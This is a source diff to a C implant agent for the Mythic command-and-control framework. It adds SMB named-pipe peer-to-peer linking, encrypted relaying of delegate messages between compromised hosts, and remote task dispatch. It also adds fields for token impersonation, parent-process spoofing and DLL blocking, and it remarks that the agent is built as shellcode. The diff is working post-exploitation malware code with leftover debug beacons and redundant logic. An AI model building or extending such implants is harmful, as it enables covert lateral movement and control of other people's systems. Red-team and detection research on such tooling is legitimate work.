@@ -9,9 +9,8 @@
 #ifdef HTTP_TRANSPORT
 #include "transport_http.h"
 #endif
-#ifdef SMB_TRANSPORT
+// Always include SMB header: link client + frame I/O used by delegate forwarding
 #include "transport_smb.h"
-#endif
 
 // TLV type constants (must match translator.py)
 #define TLV_UUID     0x01
@@ -33,6 +32,15 @@
 #define TLV_EXT_IP   0x17
 #define TLV_PROCNAME 0x18
 #define TLV_OS_INFO  0x19
+#define TLV_DELEGATES 0x1B  // delegate blobs piggybacked on get_tasking
+
+// Action bytes for P2P link/delegate protocol (must match translator.py)
+#define ACTION_LINK_ADD    0x05
+#define ACTION_LINK_MSG    0x06
+#define ACTION_LINK_REMOVE 0x07
+
+// Delegate relay magic prefix for SMB pipe frames
+#define DELEGATE_RELAY_MAGIC 0xFF
 
 // PIC-safe string/memory functions
 VOID es_memcpy(PVOID dst, const PVOID src, SIZE_T len) {
@@ -118,7 +126,7 @@ static int b64_dec_char(BYTE c) {
     return -1;
 }
 
-static BYTE* base64_encode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
+BYTE* base64_encode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
     DWORD enc_len = ((input_len + 2) / 3) * 4;
     BYTE* output = (BYTE*)es_malloc(inst, enc_len + 1);
     if (!output) return NULL;
@@ -141,7 +149,7 @@ static BYTE* base64_encode(PINSTANCE inst, const BYTE* input, DWORD input_len, D
     return output;
 }
 
-static BYTE* base64_decode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
+BYTE* base64_decode(PINSTANCE inst, const BYTE* input, DWORD input_len, DWORD* out_len) {
     while (input_len > 0 && (input[input_len - 1] == '\n' || input[input_len - 1] == '\r' || input[input_len - 1] == ' '))
         input_len--;
     if (input_len == 0 || input_len % 4 != 0) return NULL;
@@ -727,9 +735,24 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
     inst->ClrPipeWrite       = NULL;
     inst->ClrStdoutRedirected = FALSE;
 
+    // Token / spawn-modification state
+    inst->ImpersonationToken = NULL;
+    inst->SpoofPPID          = 0;
+    inst->BlockDlls          = FALSE;
+
     // Cleanup state
     inst->pOriginalAlloc  = NULL;
     inst->szOriginalAlloc = 0;
+
+    // SMB P2P link state
+    inst->Smb.pipe = NULL;
+    inst->Smb.have_link_key = FALSE;
+    inst->LinkedPeerCount = 0;
+    inst->PendingMsgCount = 0;
+    for (int _i = 0; _i < ES_MAX_LINKED_PEERS; _i++) {
+        inst->LinkedPeers[_i].pipe = NULL;
+        inst->LinkedPeers[_i].active = FALSE;
+    }
 
     // Initialize BEACON_INFO (preserve allocatedMemory set by DLL_BEACON_USER_DATA)
     ALLOCATED_MEMORY savedAm;
@@ -797,7 +820,7 @@ static BOOL tlv_find(const BYTE* buf, DWORD buf_len, BYTE type,
 // Wrap a TLV payload with the raw 36-byte UUID prefix that Mythic expects
 // when mythic_encrypts = True. Mythic strips this prefix for routing, then
 // passes the remainder to the translation container.
-static BYTE* wrap_with_uuid(PINSTANCE inst, BYTE* payload, DWORD payload_len, DWORD* out_len) {
+BYTE* wrap_with_uuid(PINSTANCE inst, BYTE* payload, DWORD payload_len, DWORD* out_len) {
     DWORD uuid_len = 36;
     DWORD total = uuid_len + payload_len;
     BYTE* buf = (BYTE*)es_malloc(inst, total);
@@ -835,7 +858,7 @@ typedef struct _ES_ADAPTER_INFO {
     ES_IP_ADDR_STR IpAddressList;
 } ES_ADAPTER_INFO;
 
-static BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
+BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     DWORD uuid_len = es_strlen(inst->Config.uuid);
 
     char hostname[256] = {0};
@@ -949,23 +972,85 @@ static BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
     return buf;
 }
 
-// Build a get_tasking TLV message
+// Build a get_tasking TLV message (simple: UUID + command only)
+// Edge creation is now handled by ACTION_LINK_ADD messages sent separately.
 static BYTE* build_get_tasking_msg(PINSTANCE inst, DWORD* msg_len) {
     DWORD uuid_len = es_strlen(inst->Config.uuid);
     xstr(_act, "get_tasking");
     const char* action = _act;
     DWORD action_len = es_strlen(action);
 
+    // Collect all pending delegate blobs into a single TLV_DELEGATES payload.
+    // Each pending message is a raw ACTION_LINK_ADD/MSG/REMOVE binary blob.
+    // Concatenate them length-prefixed: [len32 + blob] [len32 + blob] ...
+    BYTE* del_buf = NULL;
+    DWORD del_total = 0;
+    if (inst->PendingMsgCount > 0) {
+        // Calculate total size
+        for (DWORD i = 0; i < inst->PendingMsgCount; i++)
+            del_total += 4 + inst->PendingMsgs[i].len;
+        del_buf = (BYTE*)es_malloc(inst, del_total);
+        if (del_buf) {
+            DWORD dp = 0;
+            for (DWORD i = 0; i < inst->PendingMsgCount; i++) {
+                DWORD l = inst->PendingMsgs[i].len;
+                del_buf[dp++] = (BYTE)((l >> 24) & 0xFF);
+                del_buf[dp++] = (BYTE)((l >> 16) & 0xFF);
+                del_buf[dp++] = (BYTE)((l >> 8)  & 0xFF);
+                del_buf[dp++] = (BYTE)( l        & 0xFF);
+                es_memcpy(del_buf + dp, inst->PendingMsgs[i].data, l);
+                dp += l;
+                es_free(inst, inst->PendingMsgs[i].data);
+            }
+            inst->PendingMsgCount = 0;
+            del_total = dp;
+        }
+    }
+
     DWORD total = tlv_size(uuid_len) + tlv_size(action_len);
+    if (del_buf && del_total > 0) total += tlv_size(del_total);
     BYTE* buf = (BYTE*)es_malloc(inst, total);
-    if (!buf) return NULL;
+    if (!buf) { if (del_buf) es_free(inst, del_buf); return NULL; }
 
     DWORD pos = 0;
     tlv_pack(buf + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
     pos += tlv_size(uuid_len);
     tlv_pack(buf + pos, TLV_COMMAND, (const BYTE*)action, action_len);
-    *msg_len = total;
+    pos += tlv_size(action_len);
+    if (del_buf && del_total > 0) {
+        tlv_pack(buf + pos, TLV_DELEGATES, del_buf, del_total);
+        pos += tlv_size(del_total);
+        es_free(inst, del_buf);
+    }
+    *msg_len = pos;
     return buf;
+}
+
+// Queue a pending action-byte message for the main loop to send
+void queue_pending_msg(PINSTANCE inst, BYTE* data, DWORD len) {
+    if (inst->PendingMsgCount >= ES_MAX_PENDING_MSGS) {
+        // Drop oldest if full
+        es_free(inst, inst->PendingMsgs[0].data);
+        for (DWORD i = 1; i < inst->PendingMsgCount; i++) {
+            inst->PendingMsgs[i - 1] = inst->PendingMsgs[i];
+        }
+        inst->PendingMsgCount--;
+    }
+    inst->PendingMsgs[inst->PendingMsgCount].data = data;
+    inst->PendingMsgs[inst->PendingMsgCount].len = len;
+    inst->PendingMsgCount++;
+}
+
+// Find the end of the TLV stream (returns byte offset after last complete TLV)
+static DWORD tlv_stream_end(const BYTE* buf, DWORD buf_len) {
+    DWORD pos = 0;
+    while (pos + 5 <= buf_len) {
+        DWORD len = ((DWORD)buf[pos+1] << 24) | ((DWORD)buf[pos+2] << 16) |
+                    ((DWORD)buf[pos+3] << 8)  | buf[pos+4];
+        if (pos + 5 + len > buf_len) break;
+        pos += 5 + len;
+    }
+    return pos;
 }
 
 // Build a response TLV message for a task result
@@ -1003,8 +1088,22 @@ static BYTE* build_response_msg(PINSTANCE inst, const char* task_id,
     return buf;
 }
 
+// SMB-only builds have no egress channel; http_post_response lives in the
+// HTTP transport. send_mythic_msg is never called on the SMB path (the SMB
+// loop uses es_smb_process_tasking), so stub it to keep the TU compiling.
+#ifndef HTTP_TRANSPORT
+static BOOL http_post_response_stub(PINSTANCE inst, BYTE* data, DWORD len,
+                                    BYTE** resp, DWORD* rlen) {
+    (void)inst; (void)data; (void)len;
+    if (resp) *resp = NULL;
+    if (rlen) *rlen = 0;
+    return FALSE;
+}
+#define http_post_response http_post_response_stub
+#endif
+
 // Send a message to Mythic: encrypt → UUID-prepend → base64-encode → POST → base64-decode → strip UUID → decrypt
-static BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
+BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
                             BYTE** response, DWORD* resp_len) {
     BYTE* send_data = payload;
     DWORD send_len = payload_len;
@@ -1089,6 +1188,67 @@ static BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
     return TRUE;
 }
 
+#ifdef SMB_TRANSPORT
+// Shared tasking processor for the SMB P2P transport (declared in
+// transport_smb.h). Mirrors the HTTP main loop's task handling: parse a
+// decrypted get_tasking TLV message, dispatch the command through the same
+// dispatch_command table, and return a plaintext post_response TLV message
+// (the SMB transport encrypts it under the link session key).
+VOID es_smb_process_tasking(PINSTANCE inst, const BYTE* msg, DWORD msg_len,
+                            BYTE** out_resp, DWORD* out_resp_len) {
+    *out_resp = NULL;
+    *out_resp_len = 0;
+    if (!msg || msg_len == 0) return;
+
+    const BYTE* cmd_name = NULL; DWORD cmd_name_len = 0;
+    const BYTE* task_id  = NULL; DWORD task_id_len  = 0;
+    const BYTE* task_data = NULL; DWORD task_data_len = 0;
+
+    if (!tlv_find(msg, msg_len, TLV_COMMAND, &cmd_name, &cmd_name_len) ||
+        !tlv_find(msg, msg_len, TLV_TASKID, &task_id, &task_id_len))
+        return;
+    tlv_find(msg, msg_len, TLV_DATA, &task_data, &task_data_len);
+
+    char cmd_buf[64] = {0};
+    if (cmd_name_len < sizeof(cmd_buf))
+        es_memcpy(cmd_buf, (PVOID)cmd_name, cmd_name_len);
+
+    char tid_buf[40] = {0};
+    if (task_id_len < sizeof(tid_buf))
+        es_memcpy(tid_buf, (PVOID)task_id, task_id_len);
+
+    // Mythic checkin response (delegate checkin flow): the TASKID carries our
+    // newly assigned callback UUID. Update Config.uuid so all future traffic
+    // uses it, and ack with an empty response.
+    if (cmd_name_len == 7 &&
+        cmd_buf[0]=='c' && cmd_buf[1]=='h' && cmd_buf[2]=='e' && cmd_buf[3]=='c' &&
+        cmd_buf[4]=='k' && cmd_buf[5]=='i' && cmd_buf[6]=='n') {
+        DWORD cp = 0;
+        for (cp = 0; cp < task_id_len && cp < sizeof(inst->Config.uuid) - 1; cp++)
+            inst->Config.uuid[cp] = tid_buf[cp];
+        inst->Config.uuid[cp] = 0;
+        *out_resp = NULL;
+        *out_resp_len = 0;
+        return;
+    }
+
+    BYTE* out_data = NULL;
+    DWORD out_len = 0;
+    BOOL  out_error = FALSE;
+
+    dispatch_command(inst, cmd_buf, (BYTE*)task_data, task_data_len,
+                     &out_data, &out_len, &out_error);
+
+    DWORD resp_msg_len = 0;
+    BYTE* resp_msg = build_response_msg(inst, tid_buf, out_data, out_len,
+                                        out_error, &resp_msg_len);
+    if (out_data) es_free(inst, out_data);
+
+    *out_resp = resp_msg;
+    *out_resp_len = resp_msg_len;
+}
+#endif // SMB_TRANSPORT
+
 VOID agent_main(PINSTANCE inst) {
     inst->Running = TRUE;
     DBG(inst, "[ES] agent_main entered");
@@ -1142,6 +1302,10 @@ VOID agent_main(PINSTANCE inst) {
         // Get tasks
         BYTE* tasks = NULL;
         DWORD tasks_len = 0;
+
+        // Pending delegate messages are drained inside build_get_tasking_msg
+        // and included as TLV_DELEGATES in the regular get_tasking TLV stream.
+
         DWORD get_msg_len = 0;
         BYTE* get_msg = build_get_tasking_msg(inst, &get_msg_len);
         if (get_msg) {
@@ -1183,6 +1347,231 @@ VOID agent_main(PINSTANCE inst) {
                 }
                 if (out_data) es_free(inst, out_data);
             }
+
+            // ── Delegate forwarding via TLV_DELEGATES in tasking response ──
+            // The translator packs Mythic delegates as TLV_DELEGATES(0x1B) containing
+            // ACTION_LINK_MSG binary data for linked peers.
+            const BYTE* del_blob = NULL; DWORD del_blob_len = 0;
+            BOOL found_del = tlv_find(tasks, tasks_len, TLV_DELEGATES, &del_blob, &del_blob_len);
+            {
+                // DEBUG: report delegate TLV presence back through a marker TLV
+                const char* dbg = found_del ? "ESDBG:del_found" : "ESDBG:del_missing";
+                DWORD my_ulen = es_strlen(inst->Config.uuid);
+                xstr(_dbgact, "get_tasking");
+                BYTE* dbg_msg = (BYTE*)es_malloc(inst, tlv_size(my_ulen) + tlv_size(11) + tlv_size(20));
+                if (dbg_msg) {
+                    DWORD dmp = 0;
+                    tlv_pack(dbg_msg + dmp, TLV_UUID, (const BYTE*)inst->Config.uuid, my_ulen); dmp += tlv_size(my_ulen);
+                    tlv_pack(dbg_msg + dmp, TLV_COMMAND, (const BYTE*)_dbgact, 11); dmp += tlv_size(11);
+                    tlv_pack(dbg_msg + dmp, 0x7F, (const BYTE*)dbg, es_strlen((char*)dbg)); dmp += tlv_size(es_strlen((char*)dbg));
+                    send_mythic_msg(inst, dbg_msg, dmp, NULL, NULL);
+                    es_free(inst, dbg_msg);
+                }
+            }
+            if (found_del && del_blob_len > 1 && del_blob[0] == ACTION_LINK_MSG) {
+                DWORD dpos = 1;  // skip action byte
+                while (dpos + 4 < del_blob_len) {
+                    // Parse peer UUID (length-prefixed string)
+                    DWORD uuid_len = ((DWORD)del_blob[dpos] << 24) | ((DWORD)del_blob[dpos+1] << 16) |
+                                     ((DWORD)del_blob[dpos+2] << 8)  | del_blob[dpos+3];
+                    dpos += 4;
+                    if (dpos + uuid_len + 4 > del_blob_len) break;
+                    const char* peer_uuid = (const char*)(del_blob + dpos);
+                    dpos += uuid_len;
+
+                    // Parse message blob (length-prefixed bytes)
+                    DWORD msg_blob_len = ((DWORD)del_blob[dpos] << 24) | ((DWORD)del_blob[dpos+1] << 16) |
+                                         ((DWORD)del_blob[dpos+2] << 8)  | del_blob[dpos+3];
+                    dpos += 4;
+                    if (dpos + msg_blob_len > del_blob_len) break;
+                    const BYTE* msg_blob = del_blob + dpos;
+                    dpos += msg_blob_len;
+
+                    // Find matching linked peer.
+                    // UUID tracking: after the peer's delegate checkin, Mythic
+                    // re-assigns its callback UUID. Delegates then arrive with
+                    // the NEW uuid, which won't match the handshake-time uuid
+                    // stored in LinkedPeers. If no exact match, fall back to
+                    // the first active peer and adopt the delegate's uuid.
+                    BOOL relay_done = FALSE; const char* relay_fail = "no_peer_match";
+                    int match_pi = -1;
+                    int first_active = -1;
+                    for (int pi = 0; pi < ES_MAX_LINKED_PEERS; pi++) {
+                        if (!inst->LinkedPeers[pi].active) continue;
+                        if (first_active < 0) first_active = pi;
+                        DWORD pu_len = es_strlen(inst->LinkedPeers[pi].uuid);
+                        if (pu_len != uuid_len) continue;
+                        BOOL match = TRUE;
+                        for (DWORD ci = 0; ci < pu_len; ci++) {
+                            if (inst->LinkedPeers[pi].uuid[ci] != (char)peer_uuid[ci]) { match = FALSE; break; }
+                        }
+                        if (match) { match_pi = pi; break; }
+                    }
+                    if (match_pi < 0 && first_active >= 0) {
+                        // Adopt the delegate's uuid as this peer's current identity
+                        match_pi = first_active;
+                        DWORD cp = 0;
+                        for (DWORD uc = 0; uc < uuid_len && cp < sizeof(inst->LinkedPeers[match_pi].uuid) - 1; uc++)
+                            inst->LinkedPeers[match_pi].uuid[cp++] = (char)peer_uuid[uc];
+                        inst->LinkedPeers[match_pi].uuid[cp] = 0;
+                        relay_fail = "uuid_adopted";
+                    }
+                    if (match_pi >= 0) {
+                        int pi = match_pi;
+
+                        // Forward: prepend DELEGATE_RELAY_MAGIC, encrypt under link
+                        // session key, send over pipe, read response, relay back
+                        DWORD relay_len = 1 + msg_blob_len;
+                        BYTE* relay_buf = (BYTE*)es_malloc(inst, relay_len);
+                        if (relay_buf) {
+                            relay_buf[0] = DELEGATE_RELAY_MAGIC;
+                            if (msg_blob_len > 0)
+                                es_memcpy(relay_buf + 1, (PVOID)msg_blob, msg_blob_len);
+
+                            // Encrypt with our AES key (link session key)
+                            BYTE* enc_relay = NULL; DWORD enc_relay_len = 0;
+                            BOOL sent_ok = FALSE;
+                            if (mythic_encrypt(inst, relay_buf, relay_len, &enc_relay, &enc_relay_len) && enc_relay) {
+                                // DEBUG: check pipe state before write
+                                DWORD peek_avail = 0;
+                                BOOL peek_ok = inst->Win32.PeekNamedPipe(inst->LinkedPeers[pi].pipe, NULL, 0, NULL, &peek_avail, NULL);
+                                if (!peek_ok) {
+                                    static char pf_buf[32];
+                                    DWORD perr = inst->Win32.GetLastError();
+                                    es_strcpy(pf_buf, XSTR("peek_fail_"));
+                                    char pd[12] = {0}; int pdi = 0;
+                                    if (!perr) pd[pdi++] = '0';
+                                    while (perr && pdi < 11) { pd[pdi++] = '0' + (perr % 10); perr /= 10; }
+                                    for (int fc = 0; fc < pdi; fc++) pf_buf[10 + fc] = pd[pdi - 1 - fc];
+                                    pf_buf[10 + pdi] = 0;
+                                    relay_fail = pf_buf;
+                                } else {
+                                    sent_ok = smb_send_frame(inst, inst->LinkedPeers[pi].pipe, enc_relay, enc_relay_len);
+                                    if (!sent_ok) {
+                                        DWORD werr = inst->Win32.GetLastError();
+                                        relay_fail = "send_fail";
+                                        char digits[12] = {0}; int di2 = 0;
+                                        if (!werr) digits[di2++] = '0';
+                                        while (werr && di2 < 11) { digits[di2++] = '0' + (werr % 10); werr /= 10; }
+                                        static char fail_buf[32];
+                                        es_strcpy(fail_buf, XSTR("send_fail_"));
+                                        for (int fc = 0; fc < di2; fc++) fail_buf[10 + fc] = digits[di2 - 1 - fc];
+                                        fail_buf[10 + di2] = 0;
+                                        relay_fail = fail_buf;
+                                    }
+                                }
+                                es_free(inst, enc_relay);
+                            } else {
+                                relay_fail = "enc_fail";
+                            }
+                            es_free(inst, relay_buf);
+
+                            if (sent_ok) {
+                            // Read peer response
+                            BYTE* peer_resp = NULL; DWORD peer_resp_len = 0;
+                            smb_recv_frame(inst, inst->LinkedPeers[pi].pipe, &peer_resp, &peer_resp_len);
+                            if (peer_resp && peer_resp_len > 0) {
+                                // Decrypt the link-session-key layer to get raw response
+                                BYTE* dec_resp = NULL; DWORD dec_resp_len = 0;
+                                if (mythic_decrypt(inst, peer_resp, peer_resp_len, &dec_resp, &dec_resp_len) && dec_resp) {
+                                    // UUID tracking: the peer's response carries its CURRENT
+                                    // Config.uuid (TLV_UUID). After the peer processes its
+                                    // checkin response, Mythic assigns a new callback UUID -
+                                    // update our peer table so future delegates match.
+                                    const BYTE* resp_uuid = NULL; DWORD resp_uuid_len = 0;
+                                    if (tlv_find(dec_resp, dec_resp_len, TLV_UUID, &resp_uuid, &resp_uuid_len) &&
+                                        resp_uuid_len > 0 && resp_uuid_len < sizeof(inst->LinkedPeers[pi].uuid)) {
+                                        BOOL uuid_changed = FALSE;
+                                        DWORD old_len = es_strlen(inst->LinkedPeers[pi].uuid);
+                                        if (old_len != resp_uuid_len) uuid_changed = TRUE;
+                                        else {
+                                            for (DWORD uc = 0; uc < old_len; uc++) {
+                                                if (inst->LinkedPeers[pi].uuid[uc] != (char)resp_uuid[uc]) { uuid_changed = TRUE; break; }
+                                            }
+                                        }
+                                        if (uuid_changed) {
+                                            DWORD cp = 0;
+                                            for (DWORD uc = 0; uc < resp_uuid_len && cp < sizeof(inst->LinkedPeers[pi].uuid) - 1; uc++)
+                                                inst->LinkedPeers[pi].uuid[cp++] = (char)resp_uuid[uc];
+                                            inst->LinkedPeers[pi].uuid[cp] = 0;
+                                            relay_fail = "uuid_updated";
+                                        }
+                                    }
+                                    // Queue ACTION_LINK_MSG response for the next get_tasking
+                                    // (piggybacked via TLV_DELEGATES, same as ACTION_LINK_ADD)
+                                    DWORD action_msg_len = 1 + 4 + uuid_len + 4 + dec_resp_len;
+                                    BYTE* action_msg = (BYTE*)es_malloc(inst, action_msg_len);
+                                    if (action_msg) {
+                                        DWORD ap = 0;
+                                        action_msg[ap++] = ACTION_LINK_MSG;
+                                        pack_be32(action_msg + ap, uuid_len); ap += 4;
+                                        es_memcpy(action_msg + ap, (PVOID)peer_uuid, uuid_len); ap += uuid_len;
+                                        pack_be32(action_msg + ap, dec_resp_len); ap += 4;
+                                        es_memcpy(action_msg + ap, dec_resp, dec_resp_len); ap += dec_resp_len;
+                                        queue_pending_msg(inst, action_msg, ap);
+                                        if (!relay_fail || relay_fail == (const char*)NULL) relay_done = TRUE;
+                                        relay_done = TRUE;
+                                    }
+                                    es_free(inst, dec_resp);
+                                } else {
+                                    relay_fail = "decrypt_fail";
+                                }
+                                es_free(inst, peer_resp);
+                            } else {
+                                relay_fail = "no_peer_resp";
+                            }
+                            }  // end if (sent_ok)
+                        } else {
+                            relay_fail = "alloc_fail";
+                        }
+                        break;
+                    }
+                    {
+                        // DEBUG: relay result marker + uuid bytes
+                        DWORD my_ulen2 = es_strlen(inst->Config.uuid);
+                        xstr(_dbgact2, "get_tasking");
+                        char dbg2[160] = {0};
+                        es_strcpy(dbg2, XSTR("ESDBG:relay:"));
+                        es_strcpy(dbg2 + es_strlen(dbg2), relay_fail);
+                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR(" linked=["));
+                        es_strcpy(dbg2 + es_strlen(dbg2), inst->LinkedPeers[0].uuid);
+                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR("] deleg=["));
+                        // copy delegate uuid safely (not null-terminated in blob)
+                        DWORD ds = 0;
+                        for (ds = 0; ds < uuid_len && ds < 40; ds++)
+                            dbg2[es_strlen(dbg2)] = peer_uuid[ds];
+                        dbg2[es_strlen(dbg2)] = 0;
+                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR("] ulen="));
+                        char ul[8] = {0};
+                        int uvi = 0;
+                        if (!uuid_len) ul[uvi++] = '0';
+                        DWORD ut = uuid_len;
+                        while (ut && uvi < 7) { ul[uvi++] = '0' + (ut % 10); ut /= 10; }
+                        while (uvi > 0) { char c = ul[--uvi]; ul[uvi] = 0; /* reverse below */ }
+                        // simple reverse into dbg
+                        {
+                            char rev[8] = {0};
+                            int rl2 = 0;
+                            ut = uuid_len;
+                            if (!ut) rev[rl2++] = '0';
+                            while (ut && rl2 < 7) { rev[rl2++] = '0' + (ut % 10); ut /= 10; }
+                            while (rl2 > 0) dbg2[es_strlen(dbg2)] = rev[--rl2];
+                        }
+                        es_strcpy(dbg2 + es_strlen(dbg2), XSTR(" active0="));
+                        dbg2[es_strlen(dbg2)] = inst->LinkedPeers[0].active ? '1' : '0';
+                        BYTE* dbg_msg2 = (BYTE*)es_malloc(inst, tlv_size(my_ulen2) + tlv_size(11) + tlv_size(170));
+                        if (dbg_msg2) {
+                            DWORD dmp = 0;
+                            tlv_pack(dbg_msg2 + dmp, TLV_UUID, (const BYTE*)inst->Config.uuid, my_ulen2); dmp += tlv_size(my_ulen2);
+                            tlv_pack(dbg_msg2 + dmp, TLV_COMMAND, (const BYTE*)_dbgact2, 11); dmp += tlv_size(11);
+                            tlv_pack(dbg_msg2 + dmp, 0x7F, (const BYTE*)dbg2, es_strlen(dbg2)); dmp += tlv_size(es_strlen(dbg2));
+                            send_mythic_msg(inst, dbg_msg2, dmp, NULL, NULL);
+                            es_free(inst, dbg_msg2);
+                        }
+                        if (relay_done) break;
+                    }
+                }
+            }
         }
 
         if (tasks) es_free(inst, tasks);
@@ -1193,8 +1582,9 @@ VOID agent_main(PINSTANCE inst) {
 #endif // HTTP_TRANSPORT
 
 #ifdef SMB_TRANSPORT
-    // SMB P2P: start named pipe server and wait for connections
-    smb_start_server(inst);
+    // SMB P2P: serve the named pipe (link handshake + encrypted peer tasking)
+    // in a blocking loop until inst->Running goes FALSE.
+    smb_server_loop(inst);
 #endif
 
     if (inst->ExitFunc == 1) {
@@ -1268,8 +1658,10 @@ EXTERN_C VOID main_entry(PVOID base_addr) {
 
     /* NOTE: INCLUDE_EVASION_CLEANUP does not apply here. In standalone PIC mode
        base_addr is the allocation holding this agent's own .text and instance
-       storage. cleanup would VirtualProtect/zero/free it while we execute
-       inside it - instant AV on the next instruction fetch. */
+       storage (the linker script merges everything into one .text that the
+       builder dumps as shellcode). discover_shellcode_alloc/cleanup_shellcode
+       would VirtualProtect it PAGE_READWRITE, zero and free it while we are
+       still executing inside it - instant AV on the next instruction fetch. */
 
     agent_main(inst);
 }
